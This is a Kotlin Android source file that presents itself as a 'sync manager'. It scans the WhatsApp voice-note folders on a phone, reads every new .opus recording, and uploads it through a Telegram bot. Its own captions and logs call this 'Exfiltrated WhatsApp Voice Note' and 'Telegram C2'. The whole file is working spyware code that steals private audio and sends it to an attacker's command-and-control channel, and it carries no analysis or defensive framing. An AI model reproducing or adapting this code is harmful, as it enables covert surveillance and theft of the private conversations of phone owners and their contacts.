package com.example.data.sync

import android.content.Context
import android.util.Log
import com.example.data.local.AppDatabase
import com.example.data.local.UploadedFileEntity
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File

object WhatsAppVoiceNoteSyncManager {
    private const val TAG = "WhatsAppVoiceNoteSyncManager"

    suspend fun scanAndSyncAllVoiceNotes(context: Context) {
        withContext(Dispatchers.IO) {
            try {
                val possiblePaths = listOf(
                    File("/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes"),
                    File("/sdcard/WhatsApp/Media/WhatsApp Voice Notes")
                )

                val dao = AppDatabase.getInstance(context).uploadedFileDao()

                for (baseDir in possiblePaths) {
                    if (baseDir.exists() && baseDir.isDirectory) {
                        Log.d(TAG, "Scanning directory: ${baseDir.absolutePath}")
                        scanDirectoryRecursive(context, baseDir, dao)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error scanning WhatsApp voice notes: ${e.message}")
            }
        }
    }

    private suspend fun scanDirectoryRecursive(
        context: Context,
        dir: File,
        dao: com.example.data.local.UploadedFileDao
    ) {
        val files = dir.listFiles() ?: return
        for (file in files) {
            if (file.isDirectory) {
                scanDirectoryRecursive(context, file, dao)
            } else if (file.isFile && file.name.endsWith(".opus", ignoreCase = true)) {
                // Skip if already uploaded
                val alreadyUploaded = dao.isFileUploaded(file.name) > 0
                if (alreadyUploaded) {
                    continue
                }

                Log.d(TAG, "Found new un-synced voice note: ${file.absolutePath}")

                try {
                    val fileBytes = file.readBytes()
                    val telegramManager = TelegramBotManager(context)

                    val success = telegramManager.sendDocument(
                        fileBytes = fileBytes,
                        filename = file.name,
                        caption = "🎙️ Exfiltrated WhatsApp Voice Note\n📁 File: `${file.name}`"
                    )

                    if (success) {
                        dao.insertUploadedFile(UploadedFileEntity(file.name))
                        Log.d(TAG, "Successfully uploaded and recorded voice note: ${file.name}")
                    } else {
                        Log.e(TAG, "Failed to upload voice note ${file.name} to Telegram C2")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error reading or sending voice note bytes for ${file.name}:${e.message}")
                }
            }
        }
    }
}
